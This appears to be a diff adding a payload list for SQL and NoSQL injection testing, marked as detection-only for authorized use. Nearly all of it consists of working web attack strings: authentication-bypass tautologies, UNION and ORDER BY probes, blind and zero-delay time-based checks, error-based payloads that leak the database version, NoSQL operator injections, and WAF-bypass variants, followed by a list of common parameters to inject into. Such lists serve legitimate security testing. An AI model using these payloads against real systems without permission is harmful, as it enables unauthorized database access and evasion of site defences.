@@ -1,0 +1,84 @@
+# SQLi Detection Payloads
+# For authorized testing only — detection only, no destructive payloads
+
+# ── Error-based Detection ─────────────────────────────────────
+'
+"
+''
+""
+`
+')
+")
+`))
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL--
+
+# ── Boolean-based Blind ───────────────────────────────────────
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+1 AND 1=1
+1 AND 1=2
+1 AND SLEEP(0)=0--
+1 AND (SELECT 1 FROM (SELECT 1)x)=1--
+
+# ── Time-based Blind (SAFE — zero-second delay) ───────────────
+'; SELECT SLEEP(0)--
+1; WAITFOR DELAY '0:0:0'--
+1||(SELECT SLEEP(0))--
+1 AND SLEEP(0)--
+'; IF(1=1) WAITFOR DELAY '0:0:0'--
+
+# ── Error-trigger (detection) ─────────────────────────────────
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--
+
+# ── NoSQL Injection ───────────────────────────────────────────
+{"$gt": ""}
+{"$ne": null}
+{"$where": "1==1"}
+'; return true; var x='
+' || '1'=='1
+"; return true; var x="
+{$regex: ".*"}
+
+# ── ORM / Framework-specific ─────────────────────────────────
+%27
+%22
+\x27
+\x22
+\' OR 1=1--
+;SELECT%20*%20FROM%20users--
+%3BSELECT%20*%20FROM%20users--
+
+# ── WAF Bypass Variants ───────────────────────────────────────
+'/**/OR/**/'1'='1
+' /*!OR*/ '1'='1
+'%0aOR%0a'1'='1
+'%09OR%09'1'='1
+
+# ── Test Endpoints ────────────────────────────────────────────
+# Append payloads to:
+# ?id=<payload>
+# ?user=<payload>
+# ?search=<payload>
+# ?query=<payload>
+# ?name=<payload>
+# ?email=<payload>
+# ?filter=<payload>
+# ?sort=<payload>
+# ?order=<payload>
+# ?category=<payload>
+# POST body: username=<payload>&password=x
+# POST body: {"id": "<payload>"}
